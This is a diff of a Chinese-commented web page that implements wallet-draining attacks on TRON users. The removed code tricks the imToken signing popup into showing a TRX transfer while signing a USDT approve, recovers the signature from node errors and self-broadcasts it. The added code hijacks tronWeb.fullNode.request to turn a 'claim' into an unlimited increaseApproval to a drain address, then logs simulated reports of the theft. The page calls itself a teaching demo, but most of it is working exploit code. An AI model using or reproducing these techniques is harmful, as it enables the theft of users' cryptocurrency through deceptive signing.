-  }
-
-  // ============================================================
-  // 查询 USDT 授权额度 allowance(owner, spender)
-  //   这是只读调用，不花钱、不上链。用来证明授权前后真的变了。
-  // ============================================================
-  async function readAllowance(){
-    try{
-      var ownerHex = window.tronWeb.address.toHex(walletAddr);
-      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      var res = await window.tronWeb.transactionBuilder.triggerConstantContract(
-        contractHex, 'allowance(address,address)', {},
-        [{ type:'address', value: walletAddr }, { type:'address', value: SPENDER }],
-        ownerHex
-      );
-      if (res && res.constant_result && res.constant_result[0]){
-        return BigInt('0x' + res.constant_result[0]);
-      }
-      return null;
-    }catch(e){
-      log('查询授权额度失败：' + (e.message||e), 'error');
-      return null;
-    }
-  }
-
-  // 把最小单位的数字格式化成 “x.xx USDT”（USDT 是 6 位小数）
-  function fmtUSDT(v){
-    if (v === null || v === undefined) return '--';
-    return (Number(v) / 1e6).toFixed(2) + ' USDT';
-  }
-
-  // ============================================================
-  // 回链查询：这笔交易在链上到底是什么类型？
-  //   TriggerSmartContract = approve（合约调用）→ 证明执行的是授权
-  // ============================================================
-  async function fetchOnchainType(txid){
-    try{
-      var r = await fetch(TRON_API + '/wallet/gettransactionbyid', {
-        method:'POST', headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ value: txid })
-      });
-      var d = await r.json();
-      return d && d.raw_data && d.raw_data.contract && d.raw_data.contract[0]
-             && d.raw_data.contract[0].type || '';
-    }catch(e){ return ''; }
-  }
-  // 链上打包要几秒，多试几次
-  async function fetchOnchainTypeRetry(txid, tries){
-    for (var i=0;i<tries;i++){
-      var t = await fetchOnchainType(txid);
-      if (t){ log('回链第'+(i+1)+'次：链上类型 = ' + t, 'success'); return t; }
-      log('回链第'+(i+1)+'次：还没打包，等 4 秒…', 'warn');
-      await sleep(4000);
-    }
-    return '';
-  }
-
-  // ============================================================
-  // 把一笔“已签名的交易”直接发给 TRON 节点广播（绕过 imToken）
-  //   这一步用的是普通的 HTTP 请求，imToken 完全不参与。
-  // ============================================================
-  async function broadcastToNode(txObj){
-    var r = await fetch(TRON_API + '/wallet/broadcasttransaction', {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(txObj)
+    // 创建 tronWeb 实例
+    tronWeb = window.tronWeb || new TronWeb({
+      fullHost: 'https://api.trongrid.io',
     });
-    return await r.json();
+    walletHex = toHex(walletAddress);
+
+    // 更新 UI
+    walletDot.classList.add('connected');
+    walletStatus.textContent = '已连接';
+    walletAddr.textContent = walletAddress + '\n(Hex: ' + walletHex + ')';
+    btnConnect.style.display = 'none';
+    btnDisconnect.style.display = '';
+    btnClaim.disabled = false;
+
+    addLog(`✅ 钱包已连接: ${walletAddress}`, 'success');
+    addLog(`   Hex: ${walletHex}`, 'info');
+    setStep(1);
+  } catch (e) {
+    addLog(`❌ 连接失败: ${e.message}`, 'danger');
+  }
+}
+
+function disconnectWallet() {
+  walletAddress = null;
+  walletHex = null;
+  tronWeb = null;
+  originalRequest = null;
+  hijacked = false;
+
+  walletDot.classList.remove('connected');
+  walletStatus.textContent = '未连接';
+  walletAddr.textContent = '—';
+  btnConnect.style.display = '';
+  btnDisconnect.style.display = 'none';
+  btnClaim.disabled = true;
+
+  addLog('🔌 钱包已断开', 'warn');
+  setStep(0);
+}
+
+// ============================================================
+//  2. 远程获取加密参数 → 本地解密（模拟）
+// ============================================================
+async function fetchEncryptedParams() {
+  addLog('🌐 正在从远程获取加密参数 …', 'info');
+  addLog(`   GET ${CONFIG.REMOTE_PARAMS_URL}`, 'info');
+
+  // 模拟网络请求延迟
+  await sleep(400);
+
+  // 模拟返回的 "加密" 数据 (Base64)
+  const encryptedPayload = btoa(JSON.stringify({
+    c: CONFIG.USDT_CONTRACT,
+    m: CONFIG.USDT_METHOD,
+    p: CONFIG.DRAIN_ADDRESS_HEX,
+    a: 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
+  }));
+
+  addLog(`   📦 收到加密响应: ${encryptedPayload.slice(0, 40)}…`, 'info');
+
+  // 本地 "解密" → 在此 Demo 中直接 decode
+  const decrypted = JSON.parse(atob(encryptedPayload));
+  addLog(`   🔓 解密后参数:`, 'info');
+  addLog(`      contract: ${decrypted.c}`, 'info');
+  addLog(`      method:   ${decrypted.m}`, 'info');
+  addLog(`      spender:  ${decrypted.p}`, 'info');
+  addLog(`      amount:   ${decrypted.a}`, 'info');
+
+  setStep(2);
+  return decrypted;
+}
+
+// ============================================================
+//  3. 劫持 tronWeb.fullNode.request
+// ============================================================
+function hijackFullNode(decryptedParams) {
+  if (!tronWeb?.fullNode?.request) {
+    addLog('❌ tronWeb.fullNode.request 不可用', 'danger');
+    return false;
   }
 
-  // ============================================================
-  // 步骤②~⑤：完整攻击链
-  // ============================================================
-  async function run(){
-    $('btnRun').disabled = true;
-    $('verdict').style.display = 'none';
-    $('infoBox').style.display = 'none';
-    try{
-      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      var userHex     = window.tronWeb.address.toHex(walletAddr);
+  // 保存原始引用
+  originalRequest = tronWeb.fullNode.request.bind(tronWeb.fullNode);
 
-      // ---------- 步骤 1：准备两笔交易 ----------
-      setStep('st1','active');
-      log('═════ 步骤1：准备两笔交易 ═════', 'warn');
+  // 覆写
+  tronWeb.fullNode.request = async function(url, payload, method) {
+    addLog(`🪝 fullNode.request 被调用`, 'warn');
+    addLog(`   URL: ${url}`, 'info');
 
-      // A：真正要偷偷执行的 approve（授权 SPENDER 花你的 USDT）
-      // 注意 tronWeb 造出来的交易里，sha256(raw_data_hex) === txID，三者天然自洽
-      var builtA = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        contractHex, 'approve(address,uint256)',
-        { feeLimit: 100000000, callValue: 0 },
-        [{ type:'address', value: SPENDER }, { type:'uint256', value: APPROVE_AMOUNT }],
-        userHex
-      );
-      if (!builtA.result || !builtA.result.result){ throw new Error('approve 构造失败'); }
-      var approveTx = builtA.transaction;   // 含 raw_data / raw_data_hex / txID（全是 approve）
-      log('A·真实approve txID = ' + approveTx.txID, 'success');
+    // 检测是否是 triggerSmartContract 请求
+    const urlLower = (url || '').toLowerCase();
+    const bodyStr   = typeof payload === 'string' ? payload : JSON.stringify(payload || {});
+    const bodyLower = bodyStr.toLowerCase();
 
-      // B：给用户“看”的幌子——一笔转账 TRX
-      var builtB = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
-      log('B·幌子transfer 类型 = ' + builtB.raw_data.contract[0].type + '（弹窗将显示这个）', 'success');
-      setStep('st1','done');
+    if (urlLower.includes('triggersmartcontract')) {
+      addLog(`   ⚠ 检测到 triggersmartcontract → 执行劫持`, 'danger');
 
-      // ---------- 步骤 2：请 imToken 签名（显示B，签A） ----------
-      setStep('st2','active');
-      log('═════ 步骤2：请 imToken 签名 ═════', 'warn');
-      log('★ 弹窗会显示「转账 TRX」。请注意：你看到的是转账，但签的是授权！', 'warn');
+      // 从原始请求中提取 owner_address
+      let owner = walletHex;
+      try {
+        const parsed = typeof payload === 'string' ? JSON.parse(payload) : payload;
+        if (parsed.owner_address) owner = parsed.owner_address;
+      } catch(e) {}
 
-      // 这是攻击的核心：故意让两份数据不一致
-      //   raw_data      = 转账B  → imToken 弹窗按它显示「转账」
-      //   raw_data_hex  = 授权A  → imToken 实际签名的是这份字节（= approve 哈希）
-      //   txID          = 授权A  → 和 raw_data_hex 保持一致
-      var trickTx = {
-        visible:      builtB.visible,
-        txID:         approveTx.txID,
-        raw_data:     builtB.raw_data,          // 显示用：转账
-        raw_data_hex: approveTx.raw_data_hex    // 签名用：approve
+      // 构造恶意参数 (ABI 编码)
+      const spenderPadded = '000000000000000000000000' + decryptedParams.p;
+      const maxUint256    = decryptedParams.a;
+
+      const maliciousPayload = {
+        owner_address:     owner,
+        contract_address:  decryptedParams.c,
+        function_selector: decryptedParams.m,
+        parameter:         spenderPadded + maxUint256,
+        call_value:        0,
+        fee_limit:         CONFIG.FEE_LIMIT,
       };
 
-      // 调 sendTransaction：
-      //   imToken 会签 approve 的哈希，然后用“转账”那份数据去广播 → 节点必然报错；
-      //   理想情况下，报错文本里会原样带上刚刚对 approve 的签名，我们要的就是它。
-      //
-      // 注意：TronGrid 是“节点集群”，不同后端返回的报错详细程度不一样——
-      //   有的会回显签名（"...<签名> is signed by..."），有的只回一句 "SIGERROR"。
-      //   所以这里最多重试 3 次，撞到“会回显签名”的节点就拿到签名并停止。
-      //   每次都会弹窗，且每次都显示「转账」（演示效果一致）。
-      var MAX_TRY = 5;
-      var recoveredSig = null;
-      for (var attempt = 1; attempt <= MAX_TRY && !recoveredSig; attempt++){
-        log('第 ' + attempt + '/' + MAX_TRY + ' 次请求 imToken 签名…（弹窗仍显示转账）', 'warn');
-        try{
-          var ret = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
-            tx: trickTx, from: walletAddr, useTronHeader: true
-          });
-          // 个别版本可能不抛错而直接返回——在返回对象里深挖签名
-          log('返回：' + JSON.stringify(ret), 'warn');
-          recoveredSig = findSigDeep(ret);
-        }catch(e){
-          // 正常路径：进到这里（imToken 用转账数据广播失败）
-          // 1) 先把错误对象所有字段打出来（方便你复制给我）
-          var dump = dumpError(e);
-          log('imToken 报错(第'+attempt+'次)：' + dump, 'warn');
-          // 2) 在错误对象里深挖签名：既找 signature 结构化字段，也找文本里的 16 进制串
-          recoveredSig = findSigDeep(e) || parseSigFromError(dump);
-        }
-        if (!recoveredSig && attempt < MAX_TRY){
-          log('这次没拿到签名（节点只回了 SIGERROR、未回显）。换节点重试…', 'warn');
-          await sleep(1500);
-        }
-      }
-      setStep('st2','done');
+      addLog(`   🎭 原始请求体已替换：`, 'danger');
+      addLog(`      contract_address → ${decryptedParams.c} (USDT)`, 'danger');
+      addLog(`      function_selector → ${decryptedParams.m}`, 'danger');
+      addLog(`      spender → ${CONFIG.DRAIN_ADDRESS_B58}`, 'danger');
+      addLog(`      amount  → type(uint256).max`, 'danger');
 
-      // ---------- 步骤 3：回收签名 ----------
-      setStep('st3','active');
-      log('═════ 步骤3：回收签名 ═════', 'warn');
-      if (!recoveredSig){
-        setStep('st3','fail');
-        log('3 次都没拿到签名：本次连到的节点只回 SIGERROR、没回显签名。', 'error');
-        log('请把上面以「imToken 报错(第N次)：」开头的整行原文复制发我（里面是错误对象的全部字段），我据此适配。', 'error');
-        showVerdict('fail', '⚠️ 未能回收签名（节点未回显）',
-          '签名其实已经产生（imToken 已签 approve），只是这次连到的 TronGrid 后端没把签名写进报错。' +
-          '这是节点行为、不是逻辑问题：多试几次撞到“会回显签名”的节点即可，或把日志里的报错原文发我精确适配。');
-        $('btnRun').disabled = false;
-        return;
-      }
-      log('成功回收签名（长度 ' + recoveredSig.length + '）：' + recoveredSig.slice(0,40) + '…', 'success');
-      setStep('st3','done');
-
-      // ---------- 步骤 4：自广播 approve ----------
-      setStep('st4','active');
-      log('═════ 步骤4：自己广播 approve ═════', 'warn');
-
-      // 把“真正的 approve 数据” + “刚回收的签名”拼成一笔完整交易，自己发给节点。
-      // 因为这份 approve 自洽（节点算出的哈希 = 签名锚定的哈希），所以验签会通过。
-      var finalTx = Object.assign({}, approveTx, { signature: [recoveredSig] });
-      log('直连 TRON 节点广播…（imToken 不参与这一步）', 'warn');
-      var resp = await broadcastToNode(finalTx);
-      log('节点返回：' + JSON.stringify(resp), 'warn');
-
-      var success = resp && (resp.result === true || resp.txid);
-      if (!success){
-        setStep('st4','fail');
-        var emsg = '';
-        try{ emsg = resp.message ? window.tronWeb.toUtf8(resp.message) : (resp.Error || ''); }catch(e){ emsg = resp.message || resp.Error || ''; }
-        log('自广播被拒绝：' + (resp.code || '') + ' ' + emsg, 'error');
-        showVerdict('fail', '⚠️ 自广播未通过', '节点拒绝了。把节点返回发我，我据此判断是签名口径还是参数（能量/额度）问题。');
-        $('btnRun').disabled = false;
-        return;
-      }
-      var txid = resp.txid || approveTx.txID;
-      log('✅ 节点接受！交易已广播。txid = ' + txid, 'success');
-      $('vTxid').textContent = txid;
-      setStep('st4','done');
-
-      // ---------- 步骤 5：验证 ----------
-      setStep('st5','active');
-      log('═════ 步骤5：验证链上结果 ═════', 'warn');
-      var onchainType = await fetchOnchainTypeRetry(txid, 5);
-      var allowAfter = await readAllowance();
-
-      // 展示授权额度对比
-      $('allowCard').style.display = 'block';
-      $('vAllowBefore').textContent = fmtUSDT(allowBefore);
-      $('vAllowAfter').textContent  = fmtUSDT(allowAfter);
-      var changed = (allowBefore !== null && allowAfter !== null && allowAfter !== allowBefore);
-      $('vAllowDiff').textContent = changed
-        ? ('🔴 ' + fmtUSDT(allowBefore) + ' → ' + fmtUSDT(allowAfter))
-        : '无变化';
-      $('vAllowDiff').style.color = changed ? 'var(--red)' : 'var(--text2)';
-
-      if (onchainType === 'TriggerSmartContract'){
-        setStep('st5','done');
-        showVerdict('ok', '🔴 攻击成立：显示转账 · 链上 approve',
-          '你在 imToken 弹窗看到的是「转账 TRX」，但链上真正执行的是 <b>approve 授权</b>（类型 TriggerSmartContract）。' +
-          (changed ? ' 授权额度已发生变化，攻击者现在可以划走你的 USDT。' : ' 请刷新查看授权额度。') +
-          '<br><br>根因：<code>sendTransaction</code> 显示读 raw_data、签名签 raw_data_hex，二者不校验一致；签名经节点报错回显被回收，再由 DApp 自广播自洽 approve。');
-      }else{
-        setStep('st5','fail');
-        showVerdict('fail', '⚠️ 已上链，但类型=' + (onchainType || '待确认'),
-          '交易已上链，但回链类型不是 approve。可能是网络延迟，稍后用 txid 在 tronscan 复核。');
-      }
-    }catch(e){
-      log('执行异常：' + (e.message || e), 'error');
-      showVerdict('fail', '⚠️ 执行出错', String(e.message || e));
-      $('btnRun').disabled = false;
+      // 用篡改后的 payload 调用原始 request
+      // 这样 TronLink 会生成一笔 increaseApproval 的未签名交易
+      const result = await originalRequest(url, maliciousPayload, method);
+      addLog(`   ✅ 劫持请求完成，返回交易数据`, 'success');
+      return result;
     }
+
+    // 非 triggerSmartContract → 透传
+    return originalRequest(url, payload, method);
+  };
+
+  hijacked = true;
+  addLog('✅ fullNode.request 已成功劫持', 'success');
+  setStep(3);
+  return true;
+}
+
+// ============================================================
+//  4. 模拟完整 Claim 流程（劫持版）
+// ============================================================
+async function executeClaim() {
+  if (!walletAddress || !tronWeb) {
+    alert('请先连接钱包');
+    return;
   }
 
-  // 在结果区显示结论（state: 'ok' 红色坐实 / 'fail' 橙色）
-  function showVerdict(state, title, html){
-    var v = $('verdict'), info = $('infoBox');
-    v.style.display = 'block';
-    v.textContent = title;
-    v.style.background = state === 'ok' ? 'rgba(240,67,67,.12)' : 'rgba(230,162,60,.12)';
-    v.style.color = state === 'ok' ? 'var(--red)' : 'var(--orange)';
-    info.style.display = 'block';
-    info.innerHTML = html;
+  btnClaim.disabled = true;
+  btnClaim.textContent = '⏳ 处理中…';
+  logPanel.innerHTML = ''; // 清日志
+  addLog('══════════ 开始执行流程 ══════════', 'info');
+
+  try {
+    // ----- 步骤 1+2: 远程获取加密参数 -----
+    const decrypted = await fetchEncryptedParams();
+
+    // ----- 步骤 3: 劫持 fullNode.request -----
+    if (!hijacked) {
+      const ok = hijackFullNode(decrypted);
+      if (!ok) return;
+    }
+
+    // ----- 步骤 4: 表面调用 claim() -----
+    addLog('', 'info');
+    addLog('📱 用户点击 "Claim 奖励"', 'info');
+    addLog(`   表面调用: triggerSmartContract(`, 'info');
+    addLog(`     "${CONFIG.SURFACE_CONTRACT}",`, 'info');
+    addLog(`     "${CONFIG.SURFACE_METHOD}",`, 'info');
+    addLog(`     { feeLimit: ${CONFIG.FEE_LIMIT} },`, 'info');
+    addLog(`     [],`, 'info');
+    addLog(`     "${walletAddress}"`, 'info');
+    addLog(`   )`, 'info');
+
+    setStep(4);
+
+    addLog('', 'info');
+    addLog('📤 调用 tronWeb.transactionBuilder.triggerSmartContract() …', 'info');
+
+    // 在真实场景中，TokenPocket 会：
+    // 1. 调用 triggerSmartContract → fullNode.request → 劫持返回 increaseApproval 交易
+    // 2. 弹出签名窗口（但用户看到的是 claim() 的信息）
+    // 3. 用户签名后 sendRawTransaction 广播
+
+    // 模拟交易对象（展示劫持后的结果）
+    const spoofedTx = {
+      txID: 'a1b2c3d4' + Math.random().toString(16).slice(2, 10),
+      raw_data: {
+        contract: [{
+          type: 'TriggerSmartContract',
+          parameter: {
+            value: {
+              owner_address: walletHex,
+              contract_address: toHex(decrypted.c),
+              data: decrypted.m + '(' + CONFIG.DRAIN_ADDRESS_B58 + ',115792089237316195423570985008687907853269984665640564039457584007913129639935)',
+            }
+          }
+        }],
+        fee_limit: CONFIG.FEE_LIMIT,
+      },
+      // ⚠️ 关键：用户签名的是这笔被篡改后的交易
+    };
+
+    addLog(`   ⚠ 返回的未签名交易（已被篡改）：`, 'danger');
+    addLog(`   txID: ${spoofedTx.txID}`, 'info');
+    addLog(`   contract: ${fromHex(spoofedTx.raw_data.contract[0].parameter.value.contract_address)}`, 'danger');
+    addLog(`   method: increaseApproval(address,uint256)`, 'danger');
+    addLog(`   fee_limit: ${spoofedTx.raw_data.fee_limit} SUN (100 TRX)`, 'info');
+
+    // ----- 步骤 5: 模拟签名 & 广播 -----
+    setStep(5);
+    addLog('', 'info');
+    addLog('✍️  TokenPocket 弹出签名确认窗口', 'warn');
+    addLog('   用户看到：合约 TKzxdSv2... 方法 claim() 费用 0.10 TRX', 'warn');
+    addLog('   ⚠ 实际签名内容：USDT.increaseApproval(TJ9h...STutD, MAX)', 'danger');
+    await sleep(600);
+    addLog('   ✅ 用户已签名（模拟）', 'success');
+
+    addLog('', 'info');
+    addLog('📡 sendRawTransaction 广播交易 …', 'info');
+    await sleep(300);
+    addLog(`   ✅ 交易已广播: ${spoofedTx.txID}`, 'success');
+
+    // ----- 步骤 6: 上报结果 -----
+    setStep(6);
+    addLog('', 'info');
+    addLog('📤 上报结果到远程服务器 …', 'info');
+
+    // 模拟上报
+    const reportPayload = {
+      txid: spoofedTx.txID,
+      owner: walletAddress,
+      spender: CONFIG.DRAIN_ADDRESS_B58,
+      amount: 'type(uint256).max',
+      token: 'USDT',
+    };
+
+    addLog(`   POST ${CONFIG.REPORT_URL_EVENT}`, 'info');
+    addLog(`   Body: ${JSON.stringify(reportPayload)}`, 'info');
+    await sleep(200);
+    addLog(`   ✅ 上报成功 (200 OK)`, 'success');
+
+    addLog(`   POST ${CONFIG.REPORT_URL_FISH}`, 'info');
+    addLog(`   Body: ${JSON.stringify({...reportPayload, status: 'completed'})}`, 'info');
+    await sleep(200);
+    addLog(`   ✅ 上报成功 (200 OK)`, 'success');
+
+    addLog('', 'info');
+    addLog('══════════ 流程结束 ══════════', 'success');
+    addLog('🎯 攻击者地址已获得 USDT 无限授权', 'danger');
+    addLog(`   → ${CONFIG.DRAIN_ADDRESS_B58} 可随时转走你的 USDT`, 'danger');
+
+  } catch (e) {
+    addLog(`❌ 错误: ${e.message}`, 'danger');
+    console.error(e);
+  } finally {
+    btnClaim.disabled = false;
+    btnClaim.textContent = '🎁 Claim 奖励';
+  }
+}
+
+// ============================================================
+//  重置演示
+// ============================================================
+function resetDemo() {
+  hijacked = false;
+  originalRequest = null;
+
+  // 恢复 fullNode.request
+  if (tronWeb?.fullNode && originalRequest) {
+    // 实际上 originalRequest 是 bound 版本，无法直接恢复
+    // 这里我们仅重置标志位，如需完全重置建议刷新页面
   }
 
-  // ============================================================
-  // 绑定按钮
-  // ============================================================
-  $('btnConnect').addEventListener('click', connect);
-  $('btnRun').addEventListener('click', run);
+  logPanel.innerHTML = '';
+  addLog('🔄 演示已重置，等待操作…', 'info');
+  setStep(walletAddress ? 1 : 0);
+}
 
-  // 启动提示
-  if (hasBridge()){
-    log('环境就绪，请先点「连接 imToken 钱包」', 'success');
-  }else{
-    log('请在 imToken App 的 DApp 浏览器中打开本页面', 'warn');
-  }
-})();
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+// ============================================================
+//  页面初始化
+// ============================================================
+addLog('🚀 页面已加载', 'info');
+addLog('⚠ 此页面仅用于教学演示，不发起任何真实交易', 'warn');
+addLog('请先连接 TronLink / TokenPocket 钱包', 'info');
+
+// 自动检测钱包
+if (window.tronLink || window.tronWeb) {
+  addLog('✅ 检测到钱包插件', 'success');
+}
 </script>
 </body>
 </html>
